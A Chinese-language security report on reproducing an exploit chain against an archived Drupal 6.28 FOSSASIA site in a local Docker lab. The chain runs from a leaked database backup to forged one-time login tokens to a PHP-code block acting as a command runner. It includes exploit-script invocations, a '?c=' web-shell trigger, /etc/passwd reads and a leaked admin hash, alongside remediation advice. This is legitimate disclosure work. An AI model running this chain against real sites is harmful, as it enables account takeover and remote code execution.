# fossasia11-drupal 认证绕过后 RCE 分析与复现报告

- 报告时间：2026-10-10
- 目标项目：`fossasia/fossasia11-legacy`（FOSSASIA 2011 Drupal Site，历史名 `fossasia11-drupal`）
- 源码版本：master（`022331c61a923c3aeda8aaa1fcf4031ef6f75a9b`），Drupal **6.28**
- 部署方式：Docker（`php:5.6-apache` + `mysql:5.7`）完整部署 + 数据库还原
- 利用脚本：`exp/exploit_authbypass_block_rce.py`
- 验证状态：**已部署动态验证**
- 风险等级：**高危（组合链：备份泄露 → 认证绕过 → 认证后 RCE）**

> 本报告合并此前归档的分拆材料（原 `漏洞分析报告.md`、`项目漏洞与利用总结.md`）与本次动态复现记录，形成一份完整报告。

---

## 1. 结论摘要

### 1.1 直接前认证 RCE
- **未确认**：未发现匿名可直接到达的 `eval/exec` sink。

### 1.2 组合链 RCE（默认配置）
- **确认可行**：`备份泄露 → user/reset token 伪造 → 管理员会话 → PHP Filter 执行`。

| 步骤 | 漏洞/环节 | 结果 |
| --- | --- | --- |
| Step-A | 根目录备份文件泄露（`.htaccess` 规则遗漏 `*.sql.gz`） | 已复现 |
| Step-B | 伪造 Drupal 6 一次性登录 token（认证绕过） | 已复现 |
| Step-C | 认证后 `PHP code` 过滤器创建自定义 block | 已复现 |
| Step-D | 通过 `/?c=<cmd>` 触发 PHP 执行（RCE） | 已复现 |

最终以 Web 服务身份 `www-data`（容器 uid=33）执行任意系统命令；并额外验证**未被认证的匿名客户端**亦可直接触发已植入的 block runner。

---

## 2. 目标与环境

### 2.1 目标信息

| 项目 | 内容 |
| --- | --- |
| 源码仓库 | `https://github.com/fossasia/fossasia11-legacy`（历史名 `fossasia11-drupal`） |
| 测试版本 | master `022331c6`，Drupal 6.28（`modules/system/system.module: define('VERSION', '6.28')`） |
| 关键文件 | `.htaccess`、`fossasia11.sql.gz`、`modules/user/user.module`、`modules/user/user.pages.inc`、`modules/php/php.module`、`includes/common.inc` |
| 运行依赖 | Apache + mod_php（PHP 5.6）、MySQL 5.7、mysqli |

### 2.2 源码获取说明

本次验证环境**无法直连 `github.com`**（连接超时），GitHub 代理镜像对 `git` 的 TLS 握手亦失败（`GnuTLS handshake failed`）。改用代理（`http://172.21.224.1:7890`）下载官方源码 tarball 还原完整源码树：

```bash
curl -sSL -x http://172.21.224.1:7890 \
  -o /tmp/fossasia.tar.gz \
  https://codeload.github.com/fossasia/fossasia11-legacy/tar.gz/refs/heads/master
mkdir -p /tmp/fossasia11-legacy
tar xzf /tmp/fossasia.tar.gz -C /tmp/fossasia11-legacy --strip-components=1
```

源码树含数据库转储 `fossasia11.sql.gz`（20,086,396 字节）与已配置的 `sites/default/settings.php`。

### 2.3 数据库转储还原

`fossasia11.sql.gz` 为**多 gzip 成员 + 尾部原始文本拼接**的非标准转储，`gunzip` 只解出首个成员（报 `trailing garbage ignored`）。使用与利用脚本 `recover_sql_text()` 相同的逻辑完整还原：

```python
while data:
    if data.startswith(b'\x1f\x8b\x08'):
        obj = zlib.decompressobj(16 + zlib.MAX_WBITS)
        chunks.append(obj.decompress(data)); data = obj.unused_data; continue
    stripped = data.lstrip(b',\r\n \t')
    if stripped != data:
        chunks.append(data[:len(data)-len(stripped)]); data = stripped; continue
    chunks.append(data); break
```

还原得完整 SQL（44,399,201 字符，119 张表），数据库名 `fossasia`。

### 2.4 Docker 部署配置

`Dockerfile`（web）：

```dockerfile
FROM php:5.6-apache

RUN docker-php-ext-install mysqli \
 && a2enmod rewrite \
 && echo "ServerName localhost" >> /etc/apache2/apache2.conf

# 允许 Web 根目录的 .htaccess 生效（含其 FilesMatch 规则）
COPY apache-allowoverride.conf /etc/apache2/conf-available/allowoverride.conf
RUN a2enconf allowoverride

COPY php.ini /usr/local/etc/php/conf.d/zz-drupal.ini

WORKDIR /var/www/html
```

`apache-allowoverride.conf`：

```apache
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
```

`docker-compose.yml`：

```yaml
services:
  db:
    image: mysql:5.7
    container_name: fossasia-db
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: fossasia
      MYSQL_USER: drupal
      MYSQL_PASSWORD: drupal
    command:
      - --character-set-server=utf8
      - --collation-server=utf8_general_ci
    volumes:
      - ./initdb:/docker-entrypoint-initdb.d:ro

  web:
    build: .
    image: fossasia11-legacy:latest
    container_name: fossasia-web
    ports:
      - "8080:80"
    volumes:
      - /tmp/fossasia11-legacy:/var/www/html
    depends_on:
      - db
    restart: unless-stopped
```

- `initdb/001-fossasia.sql`：在还原 SQL 前加 `CREATE DATABASE IF NOT EXISTS fossasia; USE fossasia;`，由 MySQL 官方入口脚本自动导入。
- `sites/default/settings.php` 的 `$db_url` 改为 `mysqli://drupal:drupal@db/fossasia`；`sites/default/files` 设为可写。

部署：

```bash
cd /tmp/fossasia-docker
docker compose up -d --build
```

### 2.5 部署后环境事实

| 项 | 值 |
| --- | --- |
| 镜像 | `fossasia11-legacy:latest`（基于 `php:5.6-apache`） |
| 容器 | `fossasia-web`（8080→80）、`fossasia-db` |
| PHP | 5.6.40 |
| Apache | 2.4.25 (Debian) |
| MySQL | 5.7.44 |
| Drupal | 6.28 |
| 数据库 | `fossasia`，119 张表 |
| 默认主题 | `fever`（`variable.theme_default`） |
| 关键变量 | `clean_url=1`、`file_downloads=1` |
| 输入格式 | `filter_formats`: `format=4` = `PHP code`，`roles=',4,'`（仅 admin） |

入口 `http://127.0.0.1:8080/` 返回 200，标题 `FOSSASIA | Open Source in Asia ...`。

---

## 3. 默认配置基线

- `sites/default/settings.php`：`$update_free_access = FALSE;`（update.php 默认未开放匿名升级）。
- `install.php`：已安装直接退出（`Drupal already installed`）。
- 运行时变量（来自还原的 `fossasia` 库）：
  - `file_downloads = 1`（public 模式）、`file_directory_path = sites/default/files`、`clean_url = 1`。
  - `filter_formats`：`format=4` 为 `PHP code`，仅角色 `',4,'`（admin）。
  - 角色映射：`rid=1 anonymous`、`rid=2 authenticated`、`rid=4 admin`。
  - 匿名权限含 `access content`、`view uploaded files`、`access user profiles`、`access all views`。
- 根目录 `.htaccess` 的 `<FilesMatch>` 未覆盖 `*.sql.gz` 类多扩展名备份文件。

---

## 4. 漏洞成因与完整利用链

### 4.1 Step-A：备份文件泄露

根目录 `.htaccess` 的敏感文件拦截规则锚定 `$`：

```apache
<FilesMatch "\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl|svn-base)$|^(code-style\.pl|Entries.*|Repository|Root|Tag|Template|all-wcprops|entries|format)$">
  Order allow,deny
</FilesMatch>
```

`.*sql` 只在**文件名以 `.sql` 结尾**时匹配；`fossasia11.sql.gz` 结尾为 `.gz`，**不匹配**，因而匿名可下载。泄露内容含 `users.pass`（MD5 形式）与 `users.login`（最后登录时间）。

> 附注：本归档版本该 `FilesMatch` 块**缺少 `Deny from all` 指令**，规则本身亦不生效。即使补回该指令，`.sql.gz` 仍因正则不匹配而泄露。

### 4.2 Step-B：一次性登录 token 伪造（认证绕过）

- 路由（匿名可达）：`modules/user/user.module` `user_menu()` → `user/reset/%/%/%`，`access callback => TRUE`。
- token 校验：`modules/user/user.pages.inc` `user_pass_reset()`：
  ```php
  $hashed_pass == user_pass_rehash($account->pass, $timestamp, $account->login)
  ```
- token 公式：`modules/user/user.module` `user_pass_rehash()`：
  ```php
  return md5($timestamp . $password . $login);
  ```

Step-A 已泄露 `$password`（`users.pass`）与 `$login`（`users.login`），攻击者可对任意当前时间戳本地计算 token，访问 `/user/reset/<uid>/<timestamp>/<token>/login`。action=login 分支调用 `user_authenticate_finalize()` 建立管理员会话。

### 4.3 Step-C/D：认证后 PHP Filter → RCE

- 内容可选输入格式：`modules/node/node.pages.inc` `node_body_field()` → `filter_form($node->format)`。
- `PHP code` 格式绑定 admin 角色：`filter_formats` 中 `(4, 'PHP code', ',4,', 0)`。
- 执行链（source → sink）：
  1. `modules/node/node.module` `node_prepare()`：`$node->body = check_markup($node->body, $node->format, FALSE);`
  2. `modules/filter/filter.module` `check_markup()`：`$text = module_invoke($filter->module, 'filter', 'process', ...);`
  3. `modules/php/php.module` `php_filter()`：`return drupal_eval($text);`
  4. `includes/common.inc` `drupal_eval()`：`print eval('?>'. $code);`

获得管理员会话后，创建带 `PHP code` 格式的自定义 block 并发布到可见区域，即形成稳定 eval sink。

---

## 5. 动态复现与证据

目标：`http://127.0.0.1:8080`

### 5.1 Step-A：匿名下载数据库转储

```bash
curl -sSI http://127.0.0.1:8080/fossasia11.sql.gz
# HTTP/1.1 200 OK
# Content-Length: 20086396
# Content-Type: application/x-gzip
```

### 5.2 Step-B/C/D：运行利用脚本（干净链）

```bash
python3 exp/exploit_authbypass_block_rce.py \
  --base http://127.0.0.1:8080 \
  --cmd 'id; whoami; uname -a; cat /etc/passwd | head -3'
```

输出（节选）：

```text
[+] Target: http://127.0.0.1:8080
[+] Step1: Download/recover dump from /fossasia11.sql.gz
    -> parsed uid=1 user=admin last_login=1385562145 pass_hash=a679727221e372be581fb297d2837e5e
[+] Step2: Forge and use one-time login link
    -> session cookies: {'SESS5958c386bf5e9109ac10d2a628645aea': 'd3a87113fe43342d664aae79c0004722'}
[+] Step3: Create PHP block runner
    -> created block bid=27 name=ctf-rce-1791603503
[+] Step4: Publish block into visible region
    -> block published to region=right
[+] Step5: Execute command: id; whoami; uname -a; cat /etc/passwd | head -3
[+] RCE output snippet:
RCE_OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
Linux 4badc412ee61 6.18.26.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/usr/sbin:/usr/sbin/nologin
[!] No standard flag pattern found in command output
[+] Dirty-chain state saved to: exp/exploit_authbypass_block_rce.state.json
```

从解析 admin 凭据、伪造 one-time login、创建并发布 block，到命令执行 `uid=33(www-data)`，全链闭环。

### 5.3 匿名（无会话）直接触发已植入 block

```bash
curl -sS "http://127.0.0.1:8080/?c=id;hostname;cat%20/etc/hostname"
```

```text
      RCE_OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
4badc412ee61
4badc412ee61
```

block runner 对未认证客户端同样渲染执行。

### 5.4 数据库侧取证

```text
# 管理员记录
uid=1  name=admin  pass=a679727221e372be581fb297d2837e5e  login=1385562145

# 植入的 block
bid=731  module=block  delta=27  title=ctf-rce-1791603503
```

### 5.5 预期失效场景（说明性）

一次成功使用 `/user/reset/.../login` 后，Drupal 会更新真实数据库中的 `users.login`，而转储内 `last_login` 变为旧值，后续按旧值伪造 token 即失效（`final_url=.../user/password`）。此为预期行为，改用已有 cookie / `--existing-block-bid` 复用即可。本环境为**全新还原实例**，干净链一次成功。

---

## 6. 直接前认证 RCE 排除分析

### 6.1 `panels/ajax`
- 函数：`panels_ajax_router()`（`sites/all/modules/panels/panels.module`）。
- 关键门：`panels_edit_cache_get($cache_key)` 为空即拒绝；下游 `ctools_object_cache_get()` 使用 `sid=session_id()` 绑定（`sites/all/modules/ctools/includes/object-cache.inc`）。
- 结论：匿名跨会话构造执行链不可达，排除。

### 6.2 `views/ajax`
- 函数：`views_ajax()`（`sites/all/modules/views/includes/ajax.inc`）。
- 关键门：`$view->access($display_id)` + `$view->validate()`。
- 结论：未发现可控 `eval/system/unserialize` sink，排除。

### 6.3 `system/files`
- 函数：`file_download()`（`includes/file.inc`）。
- 路径限制：`file_create_path()` + `file_check_location()`；授权限制：`upload_file_download()` 要求 `view uploaded files` 且 `node_access('view')`。
- 结论：非任意路径读/执行，排除。

### 6.4 `wysiwyg/%`
- 函数：`wysiwyg_dialog()`（`sites/all/modules/wysiwyg/wysiwyg.dialog.inc`）。
- 先校验 plugin 是否在 `wysiwyg_get_all_plugins()` 白名单，再调用 `<plugin>_wysiwyg_dialog`。
- 结论：非用户可控 include/eval，排除。

---

## 7. 过滤与绕过分析

### 7.1 本项目已存在过滤

- 文件访问过滤（根目录）：`.htaccess` 的 `<FilesMatch>` 拦截若干敏感后缀，**缺陷为未覆盖多后缀 `*.sql.gz`**。
- 上传过滤（Drupal core）：
  - `file_munge_filename()`：去除 null byte（`includes/file.inc`）、中间可疑扩展加下划线；
  - `file_validate_extensions()`：后缀白名单正则锚定结尾；
  - 可执行后缀强制改名 `.txt`；
  - `sites/default/files/.htaccess`：`SetHandler Drupal_Security_Do_Not_Remove_See_SA_2006_006`（阻止目录内脚本直执）。
- reset token 过滤：时间窗 + login 时间约束 + token 公式校验；当 DB 泄露时被跨过。

### 7.2 常见绕过方法与本项目落地性

1. 双扩展、大小写、MIME 伪造、polyglot、历史 `%00` 截断等（通用上传绕过）：默认配置下 null byte 被剔除、后缀校验锚定、可执行后缀被重命名、上传目录 `SetHandler` 禁执行 → **不优先**。
2. 服务器规则遗漏（扩展保护缺口）：本项目真实可利用点即此类，`.*sql$` 未覆盖 `.sql.gz` → **当前链路最短、最稳定入口**。

---

## 8. 触发条件与适用范围

- 在“Apache + `.htaccess` 生效 + 站点根目录直接对外 + 存在 `fossasia11.sql.gz`”条件下：**可触发（确认）**。
- 失效/降级场景：根目录无备份文件；Web 服务器额外 deny `*.sql.gz`；非 Apache 且未迁移等价规则；`PHP code` 格式未授权 admin。

---

## 9. 风险评级

- **最终评级：高危（组合链 RCE）**
- 原因：匿名入口 + 认证绕过 + 明确 eval sink + 利用链短；命令执行身份 `www-data`。

---

## 10. 修复建议（最小变更优先）

1. **P0**：立即删除 Web 根目录备份文件，备份迁移到 Web Root 之外。
2. **P0**：强化根 `.htaccess`，显式拦截 `\.sql(\..+)?$`、`\.bak(\..+)?$`、`\.gz$`（按备份策略），并补回 `Deny from all`。
3. **P0**：生产环境彻底禁用 PHP Filter 模块，避免 admin 可达 `drupal_eval()` sink。
4. **P1**：对 `user/reset` 增加更强约束（短时单次签发、绑定 IP/UA、一次性 nonce）。
5. **P2**：迁移历史 MD5 账户口令到现代口令哈希，降低转储泄露后的横向风险。

---

## 11. 利用脚本说明

脚本路径：`exp/exploit_authbypass_block_rce.py`

### 11.1 参数

- `--base`：目标基址
- `--cmd`：执行命令
- `--cookie-name` / `--cookie-value`：复用已获取的管理员 session cookie（跳过认证绕过）
- `--existing-block-bid`：复用已存在的 RCE block
- `--show`：展示当前可用的“脏链”信息

脚本内已固定：dump 路径 `/fossasia11.sql.gz`、用户名 `admin`、reset token 时间偏移 `5` 秒。

### 11.2 使用方式

```bash
# 干净链（从头利用）
python3 exp/exploit_authbypass_block_rce.py --base http://127.0.0.1:8080 --cmd 'id; pwd'

# 脏链查看
python3 exp/exploit_authbypass_block_rce.py --base http://127.0.0.1:8080 --show

# 脏链复用（cookie + 现成 block）
python3 exp/exploit_authbypass_block_rce.py --base http://127.0.0.1:8080 \
  --cookie-name 'SESSxxx' --cookie-value 'yyyy' --existing-block-bid <bid> --cmd 'id; pwd'
```

---

## 12. 参考资料（在线）

- OWASP File Upload Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger Web Security Academy（File upload vulnerabilities）：https://portswigger.net/web-security/file-upload
- Apache `FilesMatch` 指令文档：https://httpd.apache.org/docs/2.4/mod/core.html#filesmatch

---

## 13. 复现步骤速查

```bash
# 1) 拉取源码（直连不可达时经代理下载 tarball）
export https_proxy=http://172.21.224.1:7890 http_proxy=http://172.21.224.1:7890 all_proxy=socks5://172.21.224.1:7890
curl -sSL -o /tmp/fossasia.tar.gz https://codeload.github.com/fossasia/fossasia11-legacy/tar.gz/refs/heads/master
tar xzf /tmp/fossasia.tar.gz -C /tmp/fossasia11-legacy --strip-components=1

# 2) 还原多成员 gzip 转储为标准 SQL（见 2.3 节逻辑），生成 initdb/001-fossasia.sql
# 3) 写入 Dockerfile / docker-compose.yml（见 2.4 节）
# 4) 构建并启动
cd /tmp/fossasia-docker && docker compose up -d --build
#    容器 fossasia-web(8080->80) + fossasia-db，镜像 fossasia11-legacy:latest

# 5) 复现
python3 exp/exploit_authbypass_block_rce.py --base http://127.0.0.1:8080 --cmd 'id; whoami'
# 或查看脏链： --show
```

访问入口：`http://127.0.0.1:8080/`
